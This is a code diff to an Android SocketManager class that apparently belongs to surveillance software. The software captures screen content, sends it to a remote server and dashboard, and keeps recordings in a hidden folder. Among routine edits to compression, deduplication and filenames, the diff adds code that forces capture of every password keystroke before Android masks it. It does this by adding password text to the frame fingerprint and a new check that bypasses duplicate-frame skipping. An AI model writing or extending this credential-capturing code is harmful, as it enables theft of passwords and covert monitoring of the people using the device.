@@ -1655,7 +1655,11 @@ public class SocketManager {
     private String gzipAndBase64(String json) {
         try {
             java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream(json.length());
-            java.util.zip.GZIPOutputStream gzip = new java.util.zip.GZIPOutputStream(bos);
+            // Use BEST_COMPRESSION (level 9) for maximum size reduction over 3G.
+            // Anonymously override the protected `def` field to set level before first write.
+            java.util.zip.GZIPOutputStream gzip = new java.util.zip.GZIPOutputStream(bos) {
+                { def.setLevel(java.util.zip.Deflater.BEST_COMPRESSION); }
+            };
             gzip.write(json.getBytes("UTF-8"));
             gzip.close();
             return android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP);
@@ -1681,7 +1685,6 @@ public class SocketManager {
             String pkg = screen.optString("packageName", "");
             JSONArray elements = screen.optJSONArray("elements");
             int elemCount = elements == null ? 0 : elements.length();
-            // Use a StringBuilder → hash to avoid large string allocations on every tick
             StringBuilder sb = new StringBuilder(256);
             sb.append(pkg).append(':').append(elemCount);
             if (elements != null) {
@@ -1693,18 +1696,41 @@ public class SocketManager {
                       .append(el.optString("text", ""))
                       .append(el.optString("contentDescription", ""))
                       .append(el.optString("hintText", ""))
+                      // Include passwordText so every password keystroke registers as a new frame
+                      .append(el.optString("passwordText", ""))
                       .append(el.optBoolean("checked", false) ? "C" : "")
                       .append(el.optBoolean("selected", false) ? "S" : "");
-                    // Include bounds top-left so scrolled content registers as different
                     JSONObject b = el.optJSONObject("bounds");
                     if (b != null) sb.append('@').append(b.optInt("top", 0));
                 }
             }
-            // Return integer hash — avoids retaining a long string in memory
             return String.valueOf(sb.toString().hashCode());
         } catch (Exception e) {
             return "";
         }
+    }
+
+    /**
+     * Returns true if the screen result contains any active password field with text.
+     * Used to bypass duplicate-frame suppression so every password keystroke is captured
+     * before Android masks the character.
+     */
+    private boolean screenHasActivePasswordField(JSONObject screenResult) {
+        if (screenResult == null) return false;
+        try {
+            JSONObject screen = screenResult.optJSONObject("screen");
+            if (screen == null) return false;
+            JSONArray elements = screen.optJSONArray("elements");
+            if (elements == null) return false;
+            for (int i = 0; i < elements.length(); i++) {
+                JSONObject el = elements.optJSONObject(i);
+                if (el != null && el.optBoolean("isPassword", false)
+                        && !el.optString("passwordText", "").isEmpty()) {
+                    return true;
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
     }
 
     /**
@@ -1759,11 +1785,14 @@ public class SocketManager {
                 // If the fingerprint matches the last sent frame, skip it so we
                 // don't flood the server (and waste 3G bandwidth) with identical data.
                 // After 2 consecutive identical frames the tick is skipped entirely.
+                // Exception: when a password field is actively being typed in, NEVER skip —
+                // password characters are briefly plain-text then masked, and we must capture
+                // every keystroke before masking occurs.
+                boolean hasPasswordInput = screenHasActivePasswordField(screenResult);
                 String fp = computeFrameFingerprint(screenResult);
-                if (!fp.isEmpty() && fp.equals(lastFrameFingerprint)) {
+                if (!hasPasswordInput && !fp.isEmpty() && fp.equals(lastFrameFingerprint)) {
                     consecutiveDuplicateCount++;
                     if (consecutiveDuplicateCount > 1) {
-                        // Screen is static — skip this tick entirely (threshold: 2 consecutive identical frames)
                         Log.d(TAG, "screen_reader: static screen, skip #" + consecutiveDuplicateCount);
                         return;
                     }
@@ -2313,6 +2342,23 @@ public class SocketManager {
      */
     private static final int MIN_FRAMES_TO_SAVE = 3;
 
+    /**
+     * Deduplicate consecutive identical frames before saving to disk.
+     * Compares frame fingerprints; identical consecutive frames are dropped so the
+     * file only contains frames where the visible screen actually changed.
+     */
+    private java.util.ArrayList<JSONObject> deduplicateFramesForSave(java.util.ArrayList<JSONObject> frames) {
+        java.util.ArrayList<JSONObject> out = new java.util.ArrayList<>(frames.size());
+        String lastFp = null;
+        for (JSONObject frame : frames) {
+            String fp = computeFrameFingerprint(frame);
+            if (!fp.isEmpty() && fp.equals(lastFp)) continue;
+            lastFp = fp;
+            out.add(frame);
+        }
+        return out;
+    }
+
     private void saveOfflineRecording(java.util.ArrayList<JSONObject> frames, long startTime) {
         if (frames == null || frames.size() < MIN_FRAMES_TO_SAVE) {
             Log.d(TAG, "saveOfflineRecording: discarding — only " +
@@ -2320,9 +2366,20 @@ public class SocketManager {
             return;
         }
         try {
+            // Remove consecutive duplicate frames — only keep frames where screen actually changed
+            java.util.ArrayList<JSONObject> dedupedFrames = deduplicateFramesForSave(frames);
+            if (dedupedFrames.size() < MIN_FRAMES_TO_SAVE) {
+                Log.d(TAG, "saveOfflineRecording: discarding after dedup — only " +
+                    dedupedFrames.size() + " unique frame(s)");
+                return;
+            }
+
             java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
             if (!dir.exists()) dir.mkdirs();
-            String filename = "sr_offline_" + startTime + ".json";
+            // Date-based filename so recordings sort chronologically in the file list
+            java.text.SimpleDateFormat filenameSdf = new java.text.SimpleDateFormat(
+                "yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault());
+            String filename = "sr_" + filenameSdf.format(new java.util.Date(startTime)) + ".json";
             java.io.File file = new java.io.File(dir, filename);
             long endTime = System.currentTimeMillis();
             java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
@@ -2334,20 +2391,21 @@ public class SocketManager {
             data.put("endTime", endTime);
             data.put("label", label);
             JSONArray framesArray = new JSONArray();
-            for (JSONObject frame : frames) { framesArray.put(frame); }
+            for (JSONObject frame : dedupedFrames) { framesArray.put(frame); }
             data.put("frames", framesArray);
-            data.put("frameCount", frames.size());
+            data.put("frameCount", dedupedFrames.size());
             java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
             byte[] bytes = data.toString().getBytes("UTF-8");
             fos.write(bytes);
             fos.close();
-            Log.i(TAG, "Offline recording saved locally: " + filename + " (" + frames.size() + " frames)");
+            Log.i(TAG, "Offline recording saved locally: " + filename + " (" + dedupedFrames.size() +
+                " unique frames, " + frames.size() + " raw captured)");
             // Notify server so dashboard knows to refresh (recordings stay on device)
             if (connected) {
                 JSONObject notify = new JSONObject();
                 notify.put("deviceId", DeviceInfo.getDeviceId(context));
                 notify.put("filename", filename);
-                notify.put("frameCount", frames.size());
+                notify.put("frameCount", dedupedFrames.size());
                 notify.put("label", label);
                 notify.put("startTime", startTime);
                 notify.put("endTime", endTime);
@@ -2368,7 +2426,7 @@ public class SocketManager {
                 java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
                 if (!dir.exists()) return;
                 java.io.File[] files = dir.listFiles(
-                    (d, name) -> name.startsWith("sr_offline_") && name.endsWith(".json"));
+                    (d, name) -> name.startsWith("sr_") && name.endsWith(".json"));
                 if (files == null || files.length == 0) return;
                 int count = 0;
                 for (java.io.File file : files) {
@@ -2423,10 +2481,13 @@ public class SocketManager {
                 result.put("recordings", new JSONArray());
                 return result;
             }
-            java.io.File[] files = dir.listFiles((d, name) -> 
+            java.io.File[] files = dir.listFiles((d, name) ->
                 name.startsWith("sr_") && name.endsWith(".json"));
             JSONArray list = new JSONArray();
             if (files != null) {
+                // Sort newest-first so the dashboard list shows most recent recording at the top
+                java.util.Arrays.sort(files,
+                    (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
                 for (java.io.File f : files) {
                     JSONObject info = new JSONObject();
                     info.put("filename", f.getName());
